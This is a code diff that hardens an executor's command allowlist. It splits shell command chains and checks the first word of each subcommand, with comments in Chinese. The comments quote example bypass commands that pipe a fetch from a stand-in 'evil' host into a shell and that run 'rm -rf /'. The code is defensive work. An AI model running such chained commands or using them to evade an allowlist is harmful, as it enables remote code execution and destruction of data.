@@ -10,7 +10,12 @@ executor.
 from __future__ import annotations
 
 import os
+import re
 import shutil
+
+# 命令链分隔符：白名单按每个子命令的首词逐个检查，
+# ``git status && curl evil | sh`` 这类链式命令不能只查第一个词。
+_SHELL_SEPARATORS = re.compile(r"(?:&&|\|\||[|;\n])")
 
 
 def detect_sandbox_backends() -> list[str]:
@@ -35,17 +40,32 @@ def command_allowlist() -> frozenset[str] | None:
     return frozenset(token.strip().lower() for token in raw.split(",") if token.strip())
 
 
+def _strip_quotes(token: str) -> str:
+    """去掉配对引号（`"git"` / `'bash'` → git / bash）。"""
+    while len(token) >= 2 and token[0] in "\"'" and token[-1] == token[0]:
+        token = token[1:-1]
+    return token
+
+
 def command_denial_reason(command_text: str) -> str | None:
-    """Reason when the command violates the allowlist, else None."""
+    """Reason when the command violates the allowlist, else None.
+
+    按 shell 链分隔符（&& || | ; 换行）切成子命令，每个子命令的首词
+    （去引号）都必须命中白名单——链式绕行（``git status; rm -rf /``）
+    会被后面的子命令拦下。
+    """
 
     allow = command_allowlist()
     if allow is None:
         return None
-    first_token = (command_text or "").strip().split(maxsplit=1)
-    if not first_token:
-        return None
-    token = first_token[0].lower()
-    # 常见 shell 包装（python/py/pytest 后面跟参数）按首词匹配。
-    if token in allow:
-        return None
-    return f"命令白名单不允许: {token}（允许: {', '.join(sorted(allow))}）"
+    for segment in _SHELL_SEPARATORS.split(command_text or ""):
+        parts = segment.strip().split(maxsplit=1)
+        if not parts:
+            continue
+        token = _strip_quotes(parts[0]).lower()
+        if token and token not in allow:
+            return (
+                f"命令白名单不允许: {token}"
+                f"（允许: {', '.join(sorted(allow))}）"
+            )
+    return None
